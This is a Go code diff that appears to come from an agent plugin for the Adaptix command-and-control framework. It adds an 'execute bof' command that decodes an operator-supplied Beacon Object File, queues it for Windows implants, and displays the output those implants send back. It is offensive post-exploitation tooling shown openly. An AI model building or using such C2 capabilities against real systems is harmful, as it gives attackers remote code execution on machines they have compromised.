@@ -10,8 +10,6 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"github.com/Adaptix-Framework/axc2"
-	"github.com/vmihailenco/msgpack/v5"
 	"io"
 	mrand "math/rand"
 	"os"
@@ -19,6 +17,9 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
+	"github.com/vmihailenco/msgpack/v5"
 )
 
 type GenerateConfig struct {
@@ -422,6 +423,42 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map
 		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
 		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}
 
+	case "execute":
+		if agent.Os != OS_WINDOWS {
+			goto RET
+		}
+
+		if subcommand == "bof" {
+			taskData.Type = TYPE_JOB
+
+			r := make([]byte, 4)
+			_, _ = rand.Read(r)
+			taskId := binary.BigEndian.Uint32(r)
+
+			taskData.TaskId = fmt.Sprintf("%08x", taskId)
+
+			bofFile, ok := args["bof"].(string)
+			if !ok {
+				err = errors.New("parameter 'bof' must be set")
+				goto RET
+			}
+			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
+			if err != nil {
+				goto RET
+			}
+
+			paramData, ok := args["param_data"].(string)
+			if !ok {
+				paramData = ""
+			}
+
+			packerData, _ := msgpack.Marshal(ParamsExecBof{Object: bofContent, ArgsPack: paramData, Task: taskData.TaskId})
+			cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
+		} else {
+			err = errors.New("subcommand must be 'bof'")
+			goto RET
+		}
+
 	case "exit":
 		cmd = Command{Code: COMMAND_EXIT, Data: nil}
 
@@ -755,6 +792,15 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 			case COMMAND_CP:
 				task.Message = "Object copied successfully"
+
+			case COMMAND_EXEC_BOF:
+				var params AnsExecBof
+				err := msgpack.Unmarshal(cmd.Data, &params)
+				if err != nil {
+					continue
+				}
+				task.Message += "BOF output"
+				task.ClearText = ConvertCpToUTF8(params.Output, agentData.ACP)
 
 			case COMMAND_EXIT:
 				task.Message = "The agent has completed its work (kill process)"
